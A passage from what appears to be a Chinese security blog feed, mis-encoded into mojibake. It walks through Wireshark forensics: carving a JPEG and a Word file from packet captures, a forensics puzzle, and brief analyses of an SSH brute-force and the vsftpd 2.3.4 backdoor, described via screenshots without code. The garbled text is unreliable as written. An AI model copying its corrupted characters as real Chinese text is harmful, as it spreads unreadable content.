è¾“å±‚æ¥è¯´éƒ½æ˜¯TCPæˆ–UDPåè®®ï¼Œæ¥æ¢å¤ä¸€ä¸‹wiresharkå®˜ç½‘æä¾›çš„æ–‡ä»¶<br><a href="https://wiki.wireshark.org/SampleCaptures?action=AttachFile&do=view&target=http_with_jpegs.cap.gz">https://wiki.wireshark.org/SampleCaptures?action=AttachFile&amp;do=view&amp;target=http_with_jpegs.cap.gz</a><br><a href="https://www.yuque.com/attachments/yuque/0/2020/gz/2789727/1605840476295-da677716-cade-446a-9ad6-7b5cd60564d5.gz?_lake_card=%7B%22uid%22:%221605840475936-0%22,%22src%22:%22https://www.yuque.com/attachments/yuque/0/2020/gz/2789727/1605840476295-da677716-cade-446a-9ad6-7b5cd60564d5.gz%22,%22name%22:%22http_with_jpegs.cap.gz%22,%22size%22:261947,%22type%22:%22application/x-gzip%22,%22ext%22:%22gz%22,%22progress%22:%7B%22percent%22:99%7D,%22status%22:%22done%22,%22percent%22:0,%22id%22:%22jhjjK%22,%22card%22:%22file%22%7D">http_with_jpegs.cap.gz</a></p><p>é¦–å…ˆåœ¨æ˜¾ç¤ºè¿‡æ»¤å™¨ä¸­ç­›é€‰å…·æœ‰jpegå†…å®¹çš„æ•°æ®åŒ…: <code>http contains &quot;jpeg&quot;</code><br><img src="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605840700672-307192b2-795c-44f9-acb5-6767a5d42d25.png#align=left&display=inline&height=343&margin=%5Bobject%20Object%5D&name=image.png&originHeight=686&originWidth=2212&size=291904&status=done&style=none&width=1106" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605840700672-307192b2-795c-44f9-acb5-6767a5d42d25.png#align=left&display=inline&height=343&margin=%5Bobject%20Object%5D&name=image.png&originHeight=686&originWidth=2212&size=291904&status=done&style=none&width=1106" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"><br>é€‰ç¬¬ä¸€ä¸ªï¼Œè¿½è¸ªtcpæµ<br><img src="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605841239748-c5db8b2a-ec6e-47bf-88b1-99de7e7c3c32.png#align=left&display=inline&height=561&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1122&originWidth=1936&size=546540&status=done&style=none&width=968" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605841239748-c5db8b2a-ec6e-47bf-88b1-99de7e7c3c32.png#align=left&display=inline&height=561&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1122&originWidth=1936&size=546540&status=done&style=none&width=968" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605841334136-f96a6202-6552-4285-bb72-ab952c06e7f3.png#align=left&display=inline&height=792&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1584&originWidth=1540&size=557977&status=done&style=none&width=770" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605841334136-f96a6202-6552-4285-bb72-ab952c06e7f3.png#align=left&display=inline&height=792&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1584&originWidth=1540&size=557977&status=done&style=none&width=770" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"><br>æœ€åç‚¹ä¸€ä¸‹ Save asâ€¦ ä¿å­˜ä¸º xxx.bin å°±å¥½ï¼Œç„¶åç”¨16è¿›åˆ¶ç¼–è¾‘å™¨æ‰“å¼€ï¼ŒJPEGçš„æ–‡ä»¶å¼€å§‹å­—èŠ‚ä¸º <code>FF D8</code>ï¼Œæ–‡ä»¶ç»“æŸå­—èŠ‚ä¸º <code>FF D9</code><br><img src="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605841552240-181bfa3f-e3d5-4362-b799-f327fb66fa23.png#align=left&display=inline&height=506&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1012&originWidth=1540&size=345491&status=done&style=none&width=770" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605841552240-181bfa3f-e3d5-4362-b799-f327fb66fa23.png#align=left&display=inline&height=506&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1012&originWidth=1540&size=345491&status=done&style=none&width=770" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"><br>ç„¶åæŠŠå…¶ä½™æ²¡ç”¨çš„éƒ½åˆ é™¤æ‰ï¼Œè¿™é‡Œå› ä¸ºç»“æŸç¬¦å·å°±æ˜¯æœ€åäº†ï¼Œå› æ­¤æŠŠä¸Šå›¾ <code>FF D8</code> ä¹‹å‰çš„éƒ½åˆ é™¤æ‰å°±å¥½äº†ã€‚<br><img src="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605841622742-4b8536ae-007b-4b11-a12c-163fd7fc896c.png#align=left&display=inline&height=394&margin=%5Bobject%20Object%5D&name=image.png&originHeight=788&originWidth=1584&size=394632&status=done&style=none&width=792" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605841622742-4b8536ae-007b-4b11-a12c-163fd7fc896c.png#align=left&display=inline&height=394&margin=%5Bobject%20Object%5D&name=image.png&originHeight=788&originWidth=1584&size=394632&status=done&style=none&width=792" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605841661621-38e7cf54-e921-4853-a5a8-3fc07c000734.png#align=left&display=inline&height=593&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1186&originWidth=1444&size=1359525&status=done&style=none&width=722" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605841661621-38e7cf54-e921-4853-a5a8-3fc07c000734.png#align=left&display=inline&height=593&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1186&originWidth=1444&size=1359525&status=done&style=none&width=722" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"><br>æˆåŠŸæ¢å¤ã€‚</p><h4 id="å–è¯å®è·µæ¡ˆä¾‹"><a href="#å–è¯å®è·µæ¡ˆä¾‹" class="headerlink" title="å–è¯å®è·µæ¡ˆä¾‹"></a>å–è¯å®è·µæ¡ˆä¾‹</h4><p><a href="https://forensicscontest.com/2009/09/25/puzzle-1-anns-bad-aim">https://forensicscontest.com/2009/09/25/puzzle-1-anns-bad-aim</a><br>å¥½åƒæ²¡äº†ã€‚ã€‚ã€‚ç„¶ååœ¨Githubæ‰¾äº†ä¸ª: <a href="https://github.com/aarud/Pcaps/blob/master/evidence01.pcap">https://github.com/aarud/Pcaps/blob/master/evidence01.pcap</a></p><h5 id="1-å¯»æ‰¾Annçš„é€šä¿¡å¥½å‹åç§°"><a href="#1-å¯»æ‰¾Annçš„é€šä¿¡å¥½å‹åç§°" class="headerlink" title="1.å¯»æ‰¾Annçš„é€šä¿¡å¥½å‹åç§°"></a>1.å¯»æ‰¾Annçš„é€šä¿¡å¥½å‹åç§°</h5><p>æ ¹æ®é¢˜ç›®åç§°æç¤º aim é€šä¿¡ï¼Œwireshark è‡ªå¸¦ aim è§£å¯†<br><img src="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605772208918-064aee2d-3b2b-4ed9-9f43-d654d1237f56.png#align=left&display=inline&height=381&margin=%5Bobject%20Object%5D&name=image.png&originHeight=762&originWidth=1042&size=277791&status=done&style=none&width=521" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605772208918-064aee2d-3b2b-4ed9-9f43-d654d1237f56.png#align=left&display=inline&height=381&margin=%5Bobject%20Object%5D&name=image.png&originHeight=762&originWidth=1042&size=277791&status=done&style=none&width=521" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"><br>è¿™ä¸‰é¡¹ä¾æ¬¡æ”¹ä¸º<br><img src="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605772589738-830ff49d-bc78-46db-8c3e-0065aef1936e.png#align=left&display=inline&height=80&margin=%5Bobject%20Object%5D&name=image.png&originHeight=160&originWidth=942&size=33306&status=done&style=none&width=471" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605772589738-830ff49d-bc78-46db-8c3e-0065aef1936e.png#align=left&display=inline&height=80&margin=%5Bobject%20Object%5D&name=image.png&originHeight=160&originWidth=942&size=33306&status=done&style=none&width=471" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"><br>ç„¶åæŸ¥çœ‹æ•°æ®åŒ…ï¼Œå‘ç°é€šä¿¡å¥½å‹åç§°æ˜¯ Sec558user1<br><img src="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605772717050-166452db-d6d3-481c-a31a-4f09dc457427.png#align=left&display=inline&height=435&margin=%5Bobject%20Object%5D&name=image.png&originHeight=870&originWidth=1680&size=214193&status=done&style=none&width=840" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605772717050-166452db-d6d3-481c-a31a-4f09dc457427.png#align=left&display=inline&height=435&margin=%5Bobject%20Object%5D&name=image.png&originHeight=870&originWidth=1680&size=214193&status=done&style=none&width=840" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><h5 id="2-é€šä¿¡è¿‡ç¨‹ä¸­çš„ç¬¬ä¸€æ¡ä¿¡æ¯å†…å®¹æ˜¯ä»€ä¹ˆ"><a href="#2-é€šä¿¡è¿‡ç¨‹ä¸­çš„ç¬¬ä¸€æ¡ä¿¡æ¯å†…å®¹æ˜¯ä»€ä¹ˆ" class="headerlink" title="2. é€šä¿¡è¿‡ç¨‹ä¸­çš„ç¬¬ä¸€æ¡ä¿¡æ¯å†…å®¹æ˜¯ä»€ä¹ˆ"></a>2. é€šä¿¡è¿‡ç¨‹ä¸­çš„ç¬¬ä¸€æ¡ä¿¡æ¯å†…å®¹æ˜¯ä»€ä¹ˆ</h5><p><img src="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605773224776-cf54fa2e-3d3d-42d5-8e46-89aa0bcd5fac.png#align=left&display=inline&height=377&margin=%5Bobject%20Object%5D&name=image.png&originHeight=754&originWidth=2166&size=186028&status=done&style=none&width=1083" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605773224776-cf54fa2e-3d3d-42d5-8e46-89aa0bcd5fac.png#align=left&display=inline&height=377&margin=%5Bobject%20Object%5D&name=image.png&originHeight=754&originWidth=2166&size=186028&status=done&style=none&width=1083" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><h5 id="3-Ann-é€šä¿¡è¿‡ç¨‹ä¸­ä¼ è¾“çš„æ–‡ä»¶åå­—"><a href="#3-Ann-é€šä¿¡è¿‡ç¨‹ä¸­ä¼ è¾“çš„æ–‡ä»¶åå­—" class="headerlink" title="3. Ann é€šä¿¡è¿‡ç¨‹ä¸­ä¼ è¾“çš„æ–‡ä»¶åå­—"></a>3. Ann é€šä¿¡è¿‡ç¨‹ä¸­ä¼ è¾“çš„æ–‡ä»¶åå­—</h5><p>æ˜¾ç¤ºè¿‡æ»¤å™¨è¾“å…¥ <code>data</code>ï¼Œç„¶åè¿½è¸ªtcpæµ<br><img src="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605773343192-020ba75d-966c-4c61-b195-943db2f8f8be.png#align=left&display=inline&height=352&margin=%5Bobject%20Object%5D&name=image.png&originHeight=704&originWidth=2226&size=395317&status=done&style=none&width=1113" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605773343192-020ba75d-966c-4c61-b195-943db2f8f8be.png#align=left&display=inline&height=352&margin=%5Bobject%20Object%5D&name=image.png&originHeight=704&originWidth=2226&size=395317&status=done&style=none&width=1113" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"><br>æ–‡ä»¶åå­—<br><img src="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605773432291-4151f4a5-d07b-425a-acd4-fc96474e1da9.png#align=left&display=inline&height=217&margin=%5Bobject%20Object%5D&name=image.png&originHeight=434&originWidth=1502&size=71877&status=done&style=none&width=751" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605773432291-4151f4a5-d07b-425a-acd4-fc96474e1da9.png#align=left&display=inline&height=217&margin=%5Bobject%20Object%5D&name=image.png&originHeight=434&originWidth=1502&size=71877&status=done&style=none&width=751" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><h5 id="4-è¿˜åŸAnnå‘é€æ–‡ä»¶å¹¶å¾—å‡ºæ–‡ä»¶å¹»æ•°ï¼ˆmagic-numberï¼‰"><a href="#4-è¿˜åŸAnnå‘é€æ–‡ä»¶å¹¶å¾—å‡ºæ–‡ä»¶å¹»æ•°ï¼ˆmagic-numberï¼‰" class="headerlink" title="4. è¿˜åŸAnnå‘é€æ–‡ä»¶å¹¶å¾—å‡ºæ–‡ä»¶å¹»æ•°ï¼ˆmagic numberï¼‰"></a>4. è¿˜åŸAnnå‘é€æ–‡ä»¶å¹¶å¾—å‡ºæ–‡ä»¶å¹»æ•°ï¼ˆmagic numberï¼‰</h5><p>æ–‡ä»¶å¹»æ•°ä»‹ç»: <a href="https://baike.baidu.com/item/magic%20number">https://baike.baidu.com/item/magic%20number</a><br>è¯´ç›´ç™½ç‚¹å°±æ˜¯ä»¥ zip ä¹‹çˆ¶çš„é¦–å­—æ¯PKæ¥å‘½åï¼Œå¯¹åº”çš„16è¿›åˆ¶æ˜¯<code>50 4B 03 04</code><br>50(P)4B(K)03(æ–‡æœ¬ç»“æŸ)04(ä¼ è¾“ç»“æŸ)ï¼Œç»„åˆèµ·æ¥å°±æ˜¯å‹ç¼©åŒ…çš„æ ‡è¯†å¼€å¤´ã€‚<br>é‚£ä¸ºå•¥wordæ–‡æ¡£çš„æ–‡ä»¶å¼€å¤´æ˜¯è¿™ä¸ªï¼ŒæŠŠwordæ–‡æ¡£åç¼€æ”¹ä¸º<code>.zip</code>è¯•è¯•ï¼Œè¿™æ˜¯å¾®è½¯2006å¹´å…¬å¸ƒçš„OOXMLè§„èŒƒã€‚</p><p>æ˜¾ç¤ºè¿‡æ»¤å™¨è¾“å…¥ <code>data</code>ï¼Œç„¶åè¿½è¸ªtcpæµ<br><img src="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605775150674-da5faf1e-18e0-402e-8a03-3aacf9cc1659.png#align=left&display=inline&height=792&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1584&originWidth=1540&size=355286&status=done&style=none&width=770" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605775150674-da5faf1e-18e0-402e-8a03-3aacf9cc1659.png#align=left&display=inline&height=792&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1584&originWidth=1540&size=355286&status=done&style=none&width=770" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"><br>å¦å­˜ä¸ºï¼Œ<code>xxx.bin</code>ï¼Œç”¨16è¿›åˆ¶ç¼–è¾‘å™¨æ‰“å¼€<code>xxx.bin</code><br><img src="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605775249230-11f41003-6bde-4b41-9440-4d6d0f6e3c7f.png#align=left&display=inline&height=308&margin=%5Bobject%20Object%5D&name=image.png&originHeight=616&originWidth=1104&size=136063&status=done&style=none&width=552" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605775249230-11f41003-6bde-4b41-9440-4d6d0f6e3c7f.png#align=left&display=inline&height=308&margin=%5Bobject%20Object%5D&name=image.png&originHeight=616&originWidth=1104&size=136063&status=done&style=none&width=552" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605775265569-bae777a6-9d33-4590-b856-bd850b64028f.png#align=left&display=inline&height=420&margin=%5Bobject%20Object%5D&name=image.png&originHeight=840&originWidth=1418&size=206237&status=done&style=none&width=709" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605775265569-bae777a6-9d33-4590-b856-bd850b64028f.png#align=left&display=inline&height=420&margin=%5Bobject%20Object%5D&name=image.png&originHeight=840&originWidth=1418&size=206237&status=done&style=none&width=709" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605775368576-d7466692-61fe-442a-b55a-894a35e087ff.png#align=left&display=inline&height=572&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1144&originWidth=2500&size=275400&status=done&style=none&width=1250" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605775368576-d7466692-61fe-442a-b55a-894a35e087ff.png#align=left&display=inline&height=572&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1144&originWidth=2500&size=275400&status=done&style=none&width=1250" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><h5 id="5-æŸ¥çœ‹æ–‡ä»¶md5å€¼"><a href="#5-æŸ¥çœ‹æ–‡ä»¶md5å€¼" class="headerlink" title="5. æŸ¥çœ‹æ–‡ä»¶md5å€¼"></a>5. æŸ¥çœ‹æ–‡ä»¶md5å€¼</h5><p><img src="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605776173099-e81a08f3-c739-4125-a673-7fe95fcc8ae8.png#align=left&display=inline&height=57&margin=%5Bobject%20Object%5D&name=image.png&originHeight=114&originWidth=762&size=57516&status=done&style=none&width=381" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605776173099-e81a08f3-c739-4125-a673-7fe95fcc8ae8.png#align=left&display=inline&height=57&margin=%5Bobject%20Object%5D&name=image.png&originHeight=114&originWidth=762&size=57516&status=done&style=none&width=381" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><h2 id="åº”ç”¨å±‚ç½‘ç»œå®‰å…¨"><a href="#åº”ç”¨å±‚ç½‘ç»œå®‰å…¨" class="headerlink" title="åº”ç”¨å±‚ç½‘ç»œå®‰å…¨"></a>åº”ç”¨å±‚ç½‘ç»œå®‰å…¨</h2><h3 id="æš´åŠ›ç ´è§£åˆ†æ"><a href="#æš´åŠ›ç ´è§£åˆ†æ" class="headerlink" title="æš´åŠ›ç ´è§£åˆ†æ"></a>æš´åŠ›ç ´è§£åˆ†æ</h3><p>åˆ†æä½¿ç”¨ medusa ç ´è§£ ssh ç™»å½•<br><img src="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605842165858-a47b2bfd-424f-4bb1-9ccd-251d6bc24d51.png#align=left&display=inline&height=459&margin=%5Bobject%20Object%5D&name=image.png&originHeight=918&originWidth=1784&size=1844097&status=done&style=none&width=892" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605842165858-a47b2bfd-424f-4bb1-9ccd-251d6bc24d51.png#align=left&display=inline&height=459&margin=%5Bobject%20Object%5D&name=image.png&originHeight=918&originWidth=1784&size=1844097&status=done&style=none&width=892" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><h3 id="åé—¨åˆ†æ"><a href="#åé—¨åˆ†æ" class="headerlink" title="åé—¨åˆ†æ"></a>åé—¨åˆ†æ</h3><p>æŸäº›è½¯ä»¶å…·æœ‰å…¶ä»–çš„ç›®çš„ -&gt; è®¾ç½®éšè—åé—¨<br>è¿™é‡Œé’ˆå¯¹vsftpd 2.3.4 åé—¨<br>å¸å·å¯†ç ä¸è¦ç´§ï¼Œæœ‰ <code>:)</code> ç¬‘è„¸å°±è¡Œï¼Œå› æ­¤è¿™ä¸ªåé—¨ä¹Ÿè¢«ç§°ä¸ºç¬‘è„¸åé—¨ï¼Œ2333<br><img src="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605842408016-3afe8bd9-95c9-4f40-bf85-6ea21bdee091.png#align=left&display=inline&height=546&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1092&originWidth=1916&size=714363&status=done&style=none&width=958" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605842408016-3afe8bd9-95c9-4f40-bf85-6ea21bdee091.png#align=left&display=inline&height=546&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1092&originWidth=1916&size=714363&status=done&style=none&width=958" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p>]]></content>
      
      
      <categories>
          
          <category> æµé‡åˆ†æ </category>
          
          <category> Wireshark </category>
          
          <category> MISC </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æµé‡åˆ†æ </tag>
            
            <tag> Wireshark </tag>
            
            <tag> MISC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>=======æ€»ç»“ &amp; æ‰‹åŠ¨åˆ†å‰²çº¿=======</title>
      <link href="2021/04/01/%E6%89%8B%E5%8A%A8%E5%88%86%E5%89%B2%E7%BA%BF/"/>
      <url>2021/04/01/%E6%89%8B%E5%8A%A8%E5%88%86%E5%89%B2%E7%BA%BF/</url>
      
        <content type="html"><![CDATA[<p>ç”±äº <a href="https://www.notion.so/">notion</a> å’Œ <a href="https://www.yuque.com/">è¯­é›€</a> ä½¿ç”¨èµ·æ¥è¿‡äºèˆ’é€‚ï¼Œå·®ç‚¹å¿˜äº†è‡ªå·±è¿˜æœ‰ä¸ªåšå®¢ï¼Œç›´åˆ° ï¼ˆé€ƒ</p><p><img src="/img/%E6%89%8B%E5%8A%A8%E5%88%86%E5%89%B2%E7%BA%BF/image-20210401190333056.png" class="lazyload" data-srcset="/img/%E6%89%8B%E5%8A%A8%E5%88%86%E5%89%B2%E7%BA%BF/image-20210401190333056.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210401190333056"></p><p>ä¸Šæ¬¡å†™åšå®¢è¿˜æ˜¯å¤§ä¸‰ä¸Šå­¦æœŸæœ«ï¼Œç°åœ¨éƒ½å·®ä¸å¤šè¦æ¯•ä¸šäº†ã€‚å¤§äºŒå¤§ä¸‰é‚£ä¼šï¼Œåœ¨å­¦æ ¡å•¥éƒ½å¹²ï¼Œä»ä¹‹å‰çš„æ–‡ç« ä¹Ÿèƒ½çœ‹å‡ºï¼ŒæœåŠ¡å™¨è¿ç»´ã€å¼€å‘ã€CTFâ€¦.</p><p>é¡ºä¾¿åšä¸ªæ€»ç»“ï¼Œè¿™ä¸€å¹´è™½æ²¡å†™åšå®¢ï¼Œä¸è¿‡æ‰¾äº†ä¸¤ä»½å®ä¹ ï¼Œä¸€ä¸ªæ˜¯åšæ¸—é€æµ‹è¯•ã€ä¸€ä¸ªæ˜¯å®‰å…¨æ”»é˜²ç ”ç©¶ï¼Œè¿˜æœ‰å­¦æ ¡å„ç§å„æ ·çš„äº‹æƒ…ï¼Œå¥½åƒä¸Šæ¬¡è·‘ <code>hexo d</code> 